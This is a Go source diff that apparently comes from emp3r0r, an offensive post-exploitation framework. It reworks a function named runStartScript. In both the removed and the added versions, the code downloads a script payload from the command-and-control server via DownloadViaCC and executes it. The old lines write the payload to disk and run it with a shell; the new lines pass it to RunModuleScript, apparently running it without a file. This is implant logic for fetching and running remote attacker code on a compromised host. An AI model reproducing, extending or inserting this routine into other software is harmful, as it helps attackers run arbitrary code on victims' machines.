@@ -4,11 +4,9 @@ import (
 	"fmt"
 	"log"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"runtime"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -101,6 +99,14 @@ func processModuleFiles(modDir string) error {
 }
 
 func runStartScript(startScript, modDir string) (string, error) {
+	// cd to module dir
+	cwd, err := os.Getwd()
+	if err != nil {
+		return "", fmt.Errorf("getwd: %w", err)
+	}
+	defer os.Chdir(cwd)
+	os.Chdir(modDir)
+
 	// Download the script payload
 	payload, err := DownloadViaCC(startScript, "")
 	if err != nil {
@@ -109,29 +115,5 @@ func runStartScript(startScript, modDir string) (string, error) {
 	scriptData := payload
 
 	log.Printf("Running %s:\n%s...", startScript, scriptData[:100])
-	if runtime.GOOS == "windows" {
-		return RunModuleScript(scriptData)
-	}
-
-	// otherwise save the file and run it
-	cwd, err := os.Getwd()
-	if err != nil {
-		return "", fmt.Errorf("getwd: %v", err)
-	}
-	if cwd != modDir {
-		os.Chdir(modDir)
-		defer os.Chdir(cwd)
-	}
-	scriptPath := filepath.Join(modDir, startScript)
-	// write script to file
-	if writeErr := os.WriteFile(scriptPath, scriptData, 0o700); writeErr != nil {
-		return "", fmt.Errorf("writing %s: %v", startScript, writeErr)
-	}
-	cmd := exec.Command(emp3r0r_data.DefaultShell, scriptPath)
-	out, err := cmd.CombinedOutput()
-	if err != nil {
-		err = fmt.Errorf("running %s: %v: %s", startScript, err, out)
-		return string(out), err
-	}
-	return string(out), nil
+	return RunModuleScript(scriptData)
 }
